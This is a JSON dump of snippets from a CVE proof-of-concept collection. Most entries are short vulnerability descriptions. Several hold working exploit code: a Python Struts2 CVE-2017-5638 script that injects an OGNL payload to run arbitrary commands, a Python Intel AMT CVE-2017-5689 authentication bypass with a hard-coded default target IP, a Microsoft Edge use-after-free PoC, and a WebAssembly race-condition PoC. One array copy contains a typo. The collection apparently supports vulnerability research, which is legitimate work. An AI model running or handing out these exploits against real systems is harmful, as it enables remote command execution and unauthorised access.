[
  {
    "owner": "qazbnm456",
    "repo": "awesome-cve-poc",
    "content": "TITLE: Main Script (CVE-2017-5116)\nDESCRIPTION: This JavaScript code is the main script for the CVE-2017-5116 proof-of-concept. It creates a SharedArrayBuffer, initializes it with WebAssembly code, creates a web worker, and sends the SharedArrayBuffer to the worker. The main thread then attempts to repeatedly instantiate the WebAssembly module from the SharedArrayBuffer while the worker modifies it, demonstrating the vulnerability.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/CVE-2017-5116.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction getSharedTypedArray(){\n    var wasmarr = [\n        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,\n        0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03,\n        0x03, 0x02, 0x00, 0x00, 0x07, 0x12, 0x01, 0x0e,\n        0x67, 0x65, 0x74, 0x41, 0x6e, 0x73, 0x77, 0x65,\n        0x72, 0x50, 0x6c, 0x75, 0x73, 0x31, 0x00, 0x01,\n        0x0a, 0x0e, 0x02, 0x04, 0x00, 0x41, 0x2a, 0x0b,\n        0x07, 0x00, 0x10, 0x00, 0x41, 0x01, 0x6a, 0x0b];\n    var sb = new SharedArrayBuffer(wasmarr.length);           //---> 1)put WebAssembly code in a SharedArrayBuffer\n    var sta = new Uint8Array(sb);\n    for(var i=0;i<sta.length;i++)\n        sta[i]=wasmarr[i];\n    return sta;    \n}\nvar blob = new Blob([\n        document.querySelector('#worker1').textContent\n        ], { type: \"text/javascript\" })\n\nvar worker = new Worker(window.URL.createObjectURL(blob));   //---> 2)create a web worker\nvar sta = getSharedTypedArray();\nworker.postMessage(sta.buffer);                              //--->3)pass the WebAssembly code to the web worker\nsetTimeout(function(){\n        while(1){\n        try{\n        sta[51]=0;\n        var myModule = new WebAssembly.Module(sta);          //--->4)parse the WebAssembly code\n        var myInstance = new WebAssembly.Instance(myModule);\n        //myInstance.exports.getAnswerPlus1();\n        }catch(e){\n        }\n        }\n    },1000);\n```\n\n----------------------------------------\n\nTITLE: Exploiting Struts2 CVE-2017-5638 with Python\nDESCRIPTION: This Python script exploits the CVE-2017-5638 vulnerability in Apache Struts2. It takes a URL and a command as input, crafts a malicious OGNL expression within the Content-Type header, and sends it to the target server. The server then executes the injected command, and the script prints the output.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/CVE-2017-5638.md#_snippet_0\n\nLANGUAGE: python\nCODE:\n```\n#!/usr/bin/python\n# -*- coding: utf-8 -*-\n\nimport urllib2\nimport httplib\n\n\ndef exploit(url, cmd):\n    payload = \"%{(#_='multipart/form-data').\"\n    payload += \"(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).\"\n    payload += \"(#_memberAccess?\"\n    payload += \"(#_memberAccess=#dm):\"\n    payload += \"((#container=#context['com.opensymphony.xwork2.ActionContext.container']).\"\n    payload += \"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).\"\n    payload += \"(#ognlUtil.getExcludedPackageNames().clear()).\"\n    payload += \"(#ognlUtil.getExcludedClasses().clear()).\"\n    payload += \"(#context.setMemberAccess(#dm)))).\"\n    payload += \"(#cmd='%s').\" % cmd\n    payload += \"(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).\"\n    payload += \"(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).\"\n    payload += \"(#p=new java.lang.ProcessBuilder(#cmds)).\"\n    payload += \"(#p.redirectErrorStream(true)).(#process=#p.start()).\"\n    payload += \"(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).\"\n    payload += \"(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).\"\n    payload += \"(#ros.flush())}\"\n\n    try:\n        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}\n        request = urllib2.Request(url, headers=headers)\n        page = urllib2.urlopen(request).read()\n    except httplib.IncompleteRead, e:\n        page = e.partial\n\n    print(page)\n    return page\n\n\nif __name__ == '__main__':\n    import sys\n    if len(sys.argv) != 3:\n        print(\"[*] struts2_S2-045.py <url> <cmd>\")\n    else:\n        print('[*] CVE: 2017-5638 - Apache Struts2 S2-045')\n        url = sys.argv[1]\n        cmd = sys.argv[2]\n        print(\"[*] cmd: %s\\n\" % cmd)\n        exploit(url, cmd)\n```\n\n----------------------------------------\n\nTITLE: Microsoft Edge UAF PoC\nDESCRIPTION: This HTML code demonstrates a use-after-free vulnerability in Microsoft Edge triggered by unexpected behavior on some JavaScript getters.  It creates an iframe, accesses getters, and then triggers the UAF. It requires Microsoft Edge to be vulnerable and has no external dependencies besides the browser itself.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/CVE-2017-0070.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<!--\n\nMicrosoft Edge: Undefined behavior on some getters\n\nI noticed that some javascript getters behave strangely.\n\nMy test code:\n\nvar whitelist = [\"closed\", \"document\", \"frames\", \"length\", \"location\", \"opener\", \"parent\", \"self\", \"top\", \"window\"];\n\nvar f = document.createElement(\"iframe\");\n\nf.onload = () => {\n    f.onload = null;\n\n    for (var x in window) {\n        if (whitelist.indexOf(x) != -1)\n            continue;\n\n        try {\n            window.__lookupGetter__(x).call(f.contentWindow);\n            log(x);\n        } catch (e) {\n\n        }\n    }\n\n};\n\nf.src = \"https://abc.xyz/\";\ndocument.body.appendChild(f);\n\nAnd after some plays, finally reached an UAF condition. PoC is attached. RIP will jump into the freed JIT code.\n\nTested on Microsoft Edge 38.14393.0.0.\n\n-->\n\n\n<pre id=\"d\">\n</pre>\n<body></body>\n\n<script>\n\nfunction log(txt) {\n    var c = document.createElement(\"div\");\n    c.innerText = \"log: \" + txt;\n    d.appendChild(c);\n}\n\nfunction main() {\n    var f = document.createElement(\"iframe\");\n\n    f.onload = () => {\n        f.onload = () => {\n            var status = window.__lookupGetter__(\"defaultStatus\").call(f.contentWindow);\n            var func_cons = status.constructor.constructor;\n\n            var ff = func_cons(\"return 0x12345;\");\n            for (var i = 0; i < 0x100000; i++)\n                ff();\n\n            f.onload = () => {\n                alert(\"get ready\");\n                ff();\n            };\n\n            f.src = \"about:blank\";\n        };\n\n        //a = f.contentWindow;\n        f.src = \"about:blank\";\n    };\n\n    document.body.appendChild(f);\n}\n\nmain();\n\n</script>\n```\n\n----------------------------------------\n\nTITLE: HTML Structure for CVE-2017-5116 PoC\nDESCRIPTION: This HTML snippet sets up the basic structure for the CVE-2017-5116 proof-of-concept. It includes a heading and two script tags: one for the web worker's code and another for the main script that orchestrates the vulnerability demonstration.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/CVE-2017-5116.md#_snippet_0\n\nLANGUAGE: HTML\nCODE:\n```\n<html>\n<h1>poc</h1>\n<script id=\"worker1\">\nworker:{\n       self.onmessage = function(arg) {\n        console.log(\"worker started\");\n        var ta = new Uint8Array(arg.data);\n        var i =0;\n        while(1){\n            if(i==0){\n                i=1;\n                ta[51]=0;   //--->4)modify the webassembly code at the same time\n            }else{\n                i=0;\n                ta[51]=128;\n            }\n        }\n    }\n}\n</script>\n<script>\nfunction getSharedTypedArray(){\n    var wasmarr = [\n        0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00,\n        0x01, 0x05, 0x01, 0x60, 0x00, 0x01, 0x7f, 0x03,\n        0x03, 0x02, 0x00, 0x00, 0x07, 0x12, 0x01, 0x0e,\n        0x67, 0x65, 0x74, 0x41, 0x6e, 0x73, 0x77, 0x65,\n        0x72, 0x50, x6c, 0x75, 0x73, 0x31, 0x00, 0x01,\n        0x0a, 0x0e, 0x02, 0x04, 0x00, 0x41, 0x2a, 0x0b,\n        0x07, 0x00, 0x10, 0x00, 0x41, 0x01, 0x6a, 0x0b];\n    var sb = new SharedArrayBuffer(wasmarr.length);           //---> 1)put WebAssembly code in a SharedArrayBuffer\n    var sta = new Uint8Array(sb);\n    for(var i=0;i<sta.length;i++)\n        sta[i]=wasmarr[i];\n    return sta;    \n}\nvar blob = new Blob([\n        document.querySelector('#worker1').textContent\n        ], { type: \"text/javascript\" })\n\nvar worker = new Worker(window.URL.createObjectURL(blob));   //---> 2)create a web worker\nvar sta = getSharedTypedArray();\nworker.postMessage(sta.buffer);                              //--->3)pass the WebAssembly code to the web worker\nsetTimeout(function(){\n        while(1){\n        try{\n        sta[51]=0;\n        var myModule = new WebAssembly.Module(sta);          //--->4)parse the WebAssembly code\n        var myInstance = new WebAssembly.Instance(myModule);\n        //myInstance.exports.getAnswerPlus1();\n        }catch(e){\n        }\n        }\n    },1000);\n\n//worker.terminate(); \n</script>\n</html>\n```\n\n----------------------------------------\n\nTITLE: Exploiting CVE-2017-5689 via Python\nDESCRIPTION: This Python script exploits CVE-2017-5689 by sending a crafted HTTP request to bypass authentication. It retrieves authentication parameters from the server's response headers and constructs a 'Digest' authorization header. The script requires the 'requests' library and takes the target IP address as a command-line argument or defaults to '168.235.84.117'.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/CVE-2017-5689.md#_snippet_0\n\nLANGUAGE: Python\nCODE:\n```\n#!/usr/bin/env python\nimport requests\nimport sys\n\nif len(sys.argv) > 1:\n   ip = str(sys.argv[1])\nelse:\n   ip = '168.235.84.117'\n\nurl = 'http://'+ip+':16992/index.htm'\nreq = requests.get(url)\nauth = req.headers['WWW-Authenticate']\nwords = auth.split('\"')\nheaders = 'Digest username= \"admin\", realm=\"'+words[1]+'\", nonce=\"'+words[3]+'\", uri=\"index.htm\", response=\"\", qop=\"auth\", nc=\"00000001\", cnonce=\"8858482c60513ab5\" '\npoc = requests.get(url, headers={'Authorization': headers})\nif poc.status_code == 200:\n   print('Success')\nelse:\n   print('Failed')\n\n```\n\n----------------------------------------\n\nTITLE: Web Worker Script (CVE-2017-5116)\nDESCRIPTION: This JavaScript code defines the functionality of the web worker in the CVE-2017-5116 PoC. It receives a SharedArrayBuffer containing WebAssembly code and continuously modifies a specific byte (index 51) within the buffer in a loop. This modification occurs concurrently with the main thread's attempts to instantiate the WebAssembly module, triggering the vulnerability.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/CVE-2017-5116.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nself.onmessage = function(arg) {\n        console.log(\"worker started\");\n        var ta = new Uint8Array(arg.data);\n        var i =0;\n        while(1){\n            if(i==0){\n                i=1;\n                ta[51]=0;   //--->4)modify the webassembly code at the same time\n            }else{\n                i=0;\n                ta[51]=128;\n            }\n        }\n    }\n```\n\n----------------------------------------\n\nTITLE: VBScript Injection in gnome-exe-thumbnailer\nDESCRIPTION: The VBScript snippet relates to CVE-2017-11421, describing a VBScript injection vulnerability in gnome-exe-thumbnailer.  It demonstrates how a malicious MSI file with VBScript code in its filename can be crafted to execute arbitrary code when a user navigates to the directory containing the MSI file in GNOME Files.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_1\n\nLANGUAGE: VBScript\nCODE:\n```\ngnome-exe-thumbnailer before 0.9.5 is prone to a VBScript Injection when generating thumbnails for MSI files, aka the \"Bad Taste\" issue. There is a local attack if the victim uses the GNOME Files file manager, and navigates to a directory containing a .msi file with VBScript code in its filename.\n```\n\n----------------------------------------\n\nTITLE: Stack Buffer Overflow in ICU (CVE-2017-15396)\nDESCRIPTION: This CVE refers to a stack buffer overflow vulnerability in the NumberingSystem component of International Components for Unicode (ICU) for C/C++ before version 60.2. This vulnerability can be triggered by a crafted HTML page and may lead to heap corruption, impacting Google Chrome versions prior to 62.0.3202.75.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_8\n\n\n\n----------------------------------------\n\nTITLE: Arbitrary Unmap in MediaServer (CVE-2017-14904)\nDESCRIPTION: This CVE describes a vulnerability in Android for MSM, Firefox OS for MSM, and QRD Android, affecting all Android releases from CAF using the Linux kernel. A crafted binder request can trigger an arbitrary unmap in the MediaServer process, potentially leading to a denial of service or other security issues.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_3\n\n\n\n----------------------------------------\n\nTITLE: Insufficient Data Validation in V8 (CVE-2017-15428)\nDESCRIPTION: This CVE describes an insufficient data validation vulnerability in the V8 builtins string generator that can lead to out-of-bounds read and write access in Google Chrome versions prior to 62.0.3202.94. A remote attacker can execute arbitrary code inside a sandbox by crafting a malicious HTML page.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_15\n\n\n\n----------------------------------------\n\nTITLE: Integer Underflow in dnsmasq (CVE-2017-14496)\nDESCRIPTION: This CVE refers to an integer underflow vulnerability in the add_pseudoheader function of dnsmasq. When the --add-mac, --add-cpe-id, or --add-subnet option is used, a remote attacker can cause a denial of service by sending a crafted DNS request. This vulnerability affects dnsmasq versions before 2.78.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_2\n\n\n\n----------------------------------------\n\nTITLE: Memory Corruption in WebAssembly (CVE-2017-15401)\nDESCRIPTION: This CVE describes a memory corruption vulnerability in WebAssembly that could lead to out-of-bounds read and write access via V8 in Google Chrome versions prior to 62.0.3202.62. A remote attacker can execute arbitrary code inside a sandbox by crafting a malicious HTML page.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_11\n\n\n\n----------------------------------------\n\nTITLE: Out-of-Bounds Memory Read in Skia (CVE-2017-15388)\nDESCRIPTION: This CVE describes an out-of-bounds memory read vulnerability in Skia, the graphics engine used in Google Chrome versions prior to 62.0.3202.62. A remote attacker can exploit this vulnerability by crafting a malicious HTML page that triggers the vulnerability during the processing of non-finite points.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_7\n\n\n\n----------------------------------------\n\nTITLE: Arbitrary Memory Write in CPU-Z (CVE-2017-15303)\nDESCRIPTION: This CVE describes a vulnerability in CPU-Z before version 1.43 where an arbitrary memory write can lead to privilege escalation. Any program running on the local machine can issue an ioctl call to the kernel-mode driver (e.g., cpuz141_x64.sys) to exploit this vulnerability.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_5\n\n\n\n----------------------------------------\n\nTITLE: Use-After-Free in libxml2 (CVE-2017-15412)\nDESCRIPTION: This CVE describes a use-after-free vulnerability in libxml2 before version 2.9.5, as used in Google Chrome versions prior to 63.0.3239.84 and other products. A remote attacker can potentially exploit heap corruption via a crafted HTML page.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_13\n\n\n\n----------------------------------------\n\nTITLE: RSA Key Generation Mishandling in Infineon TPM (CVE-2017-15361)\nDESCRIPTION: This CVE refers to a vulnerability in the Infineon RSA library within Infineon TPM firmware. The mishandling of RSA key generation allows attackers to compromise cryptographic protection mechanisms. This vulnerability is also known as ROCA and affects technologies like BitLocker and YubiKey.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_6\n\n\n\n----------------------------------------\n\nTITLE: Stack Buffer Overflow in QUIC (CVE-2017-15398)\nDESCRIPTION: This CVE describes a stack buffer overflow vulnerability in the QUIC networking stack in Google Chrome versions prior to 62.0.3202.89. A remote attacker can exploit this vulnerability by setting up a malicious server that triggers the overflow, potentially leading to code execution.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_9\n\n\n\n----------------------------------------\n\nTITLE: Exploiting Supervisor XML-RPC via Python\nDESCRIPTION: This Python script, associated with CVE-2017-11610, demonstrates how to exploit an XML-RPC vulnerability in Supervisor. It uses the `xmlrpclib` library to send a crafted XML-RPC request to execute arbitrary commands on the server.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_0\n\nLANGUAGE: Python\nCODE:\n```\nhttps://github.com/ysrc/xunfeng/blob/master/vulscan/vuldb/crack_supervisor_web.py\n```\n\n----------------------------------------\n\nTITLE: Uninitialized Palette in ImageMagick (CVE-2017-15277)\nDESCRIPTION: This CVE refers to an issue in ImageMagick where the palette is not initialized when processing GIF files without a global or local palette. If ImageMagick is used as a library and processes sensitive data, this uninitialized palette can lead to information leakage.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_4\n\n\n\n----------------------------------------\n\nTITLE: Incorrect Serialization in IPC (CVE-2017-15415)\nDESCRIPTION: This CVE refers to an incorrect serialization vulnerability in the Inter-Process Communication (IPC) mechanism in Google Chrome versions prior to 63.0.3239.84. A remote attacker can leak the value of a pointer by crafting a malicious HTML page.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_14\n\n\n\n----------------------------------------\n\nTITLE: Use-After-Free in V8 (CVE-2017-15399)\nDESCRIPTION: This CVE refers to a use-after-free vulnerability in the V8 JavaScript engine in Google Chrome versions prior to 62.0.3202.89. A remote attacker can potentially exploit heap corruption by crafting a malicious HTML page that triggers the vulnerability.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_10\n\n\n\n----------------------------------------\n\nTITLE: Use-After-Free in PDFium (CVE-2017-15411)\nDESCRIPTION: This CVE refers to a use-after-free vulnerability in PDFium, the PDF rendering library used in Google Chrome versions prior to 63.0.3239.84. A remote attacker can potentially exploit heap corruption by crafting a malicious PDF file.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_12\n\n\n\n----------------------------------------\n\nTITLE: Command Injection in TP-Link Devices (CVE-2017-15615)\nDESCRIPTION: This CVE describes a command injection vulnerability in TP-Link WVR, WAR, and ER devices. Remote authenticated administrators can execute arbitrary commands via command injection in the lcpechointerval variable in the pptp_client.lua file.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_18\n\n\n\n----------------------------------------\n\nTITLE: Command Injection in TP-Link Devices (CVE-2017-15628)\nDESCRIPTION: This CVE describes a command injection vulnerability in TP-Link WVR, WAR, and ER devices. Remote authenticated administrators can execute arbitrary commands via command injection in the lcpechointerval variable in the pptp_server.lua file.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_31\n\n\n\n----------------------------------------\n\nTITLE: Command Injection in TP-Link Devices (CVE-2017-15622)\nDESCRIPTION: This CVE describes a command injection vulnerability in TP-Link WVR, WAR, and ER devices. Remote authenticated administrators can execute arbitrary commands via command injection in the new-mppeencryption variable in the pptp_client.lua file.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_25\n\n\n\n----------------------------------------\n\nTITLE: Command Injection in TP-Link Devices (CVE-2017-15624)\nDESCRIPTION: This CVE describes a command injection vulnerability in TP-Link WVR, WAR, and ER devices. Remote authenticated administrators can execute arbitrary commands via command injection in the new-authtype variable in the pptp_server.lua file.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_27\n\n\n\n----------------------------------------\n\nTITLE: Command Injection in TP-Link Devices (CVE-2017-15619)\nDESCRIPTION: This CVE describes a command injection vulnerability in TP-Link WVR, WAR, and ER devices. Remote authenticated administrators can execute arbitrary commands via command injection in the pptphellointerval variable in the pptp_client.lua file.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_22\n\n\n\n----------------------------------------\n\nTITLE: Command Injection in TP-Link Devices (CVE-2017-15627)\nDESCRIPTION: This CVE describes a command injection vulnerability in TP-Link WVR, WAR, and ER devices. Remote authenticated administrators can execute arbitrary commands via command injection in the new-pns variable in the pptp_client.lua file.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_30\n\n\n\n----------------------------------------\n\nTITLE: Command Injection in TP-Link Devices (CVE-2017-15614)\nDESCRIPTION: This CVE describes a command injection vulnerability in TP-Link WVR, WAR, and ER devices. Remote authenticated administrators can execute arbitrary commands via command injection in the new-outif variable in the pptp_client.lua file.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_17\n\n\n\n----------------------------------------\n\nTITLE: Command Injection in TP-Link Devices (CVE-2017-15629)\nDESCRIPTION: This CVE describes a command injection vulnerability in TP-Link WVR, WAR, and ER devices. Remote authenticated administrators can execute arbitrary commands via command injection in the new-tunnelname variable in the pptp_client.lua file.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_32\n\n\n\n----------------------------------------\n\nTITLE: Command Injection in TP-Link Devices (CVE-2017-15625)\nDESCRIPTION: This CVE describes a command injection vulnerability in TP-Link WVR, WAR, and ER devices. Remote authenticated administrators can execute arbitrary commands via command injection in the new-olmode variable in the pptp_client.lua file.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_28\n\n\n\n----------------------------------------\n\nTITLE: Command Injection in TP-Link Devices (CVE-2017-15626)\nDESCRIPTION: This CVE describes a command injection vulnerability in TP-Link WVR, WAR, and ER devices. Remote authenticated administrators can execute arbitrary commands via command injection in the new-bindif variable in the pptp_server.lua file.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_29\n\n\n\n----------------------------------------\n\nTITLE: Command Injection in TP-Link Devices (CVE-2017-15618)\nDESCRIPTION: This CVE describes a command injection vulnerability in TP-Link WVR, WAR, and ER devices. Remote authenticated administrators can execute arbitrary commands via command injection in the new-enable variable in the pptp_client.lua file.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_21\n\n\n\n----------------------------------------\n\nTITLE: Command Injection in TP-Link Devices (CVE-2017-15616)\nDESCRIPTION: This CVE describes a command injection vulnerability in TP-Link WVR, WAR, and ER devices. Remote authenticated administrators can execute arbitrary commands via command injection in the new-interface variable in the phddns.lua file.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_19\n\n\n\n----------------------------------------\n\nTITLE: Command Injection in TP-Link Devices (CVE-2017-15621)\nDESCRIPTION: This CVE describes a command injection vulnerability in TP-Link WVR, WAR, and ER devices. Remote authenticated administrators can execute arbitrary commands via command injection in the olmode variable in the interface_wan.lua file.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_24\n\n\n\n----------------------------------------\n\nTITLE: Command Injection in TP-Link Devices (CVE-2017-15620)\nDESCRIPTION: This CVE describes a command injection vulnerability in TP-Link WVR, WAR, and ER devices. Remote authenticated administrators can execute arbitrary commands via command injection in the new-zone variable in the ipmac_import.lua file.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_23\n\n\n\n----------------------------------------\n\nTITLE: Command Injection in TP-Link Devices (CVE-2017-15617)\nDESCRIPTION: This CVE describes a command injection vulnerability in TP-Link WVR, WAR, and ER devices. Remote authenticated administrators can execute arbitrary commands via command injection in the iface variable in the interface_wan.lua file.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_20\n\n\n\n----------------------------------------\n\nTITLE: Command Injection in TP-Link Devices (CVE-2017-15623)\nDESCRIPTION: This CVE describes a command injection vulnerability in TP-Link WVR, WAR, and ER devices. Remote authenticated administrators can execute arbitrary commands via command injection in the new-enable variable in the pptp_server.lua file.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_26\n\n\n\n----------------------------------------\n\nTITLE: Command Injection in TP-Link Devices (CVE-2017-15613)\nDESCRIPTION: This CVE describes a command injection vulnerability in TP-Link WVR, WAR, and ER devices. Remote authenticated administrators can execute arbitrary commands via command injection in the new-interface variable in the cmxddns.lua file.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/README.md#_snippet_16\n\n\n\n----------------------------------------\n\nTITLE: CVE-2018-0492 PoC Exploit\nDESCRIPTION: This C code snippet represents a Proof of Concept (PoC) exploit for CVE-2018-0492. It demonstrates a race condition vulnerability. The code is located at the provided gist URL.\nSOURCE: https://github.com/qazbnm456/awesome-cve-poc/blob/master/CVE-2018-0492.md#_snippet_0\n\nLANGUAGE: C\nCODE:\n```\nN/A - Code is located at: https://gist.github.com/fkt/5f8f9560ef54e11ff7df8bec09dc8f9a\n```"
  }
]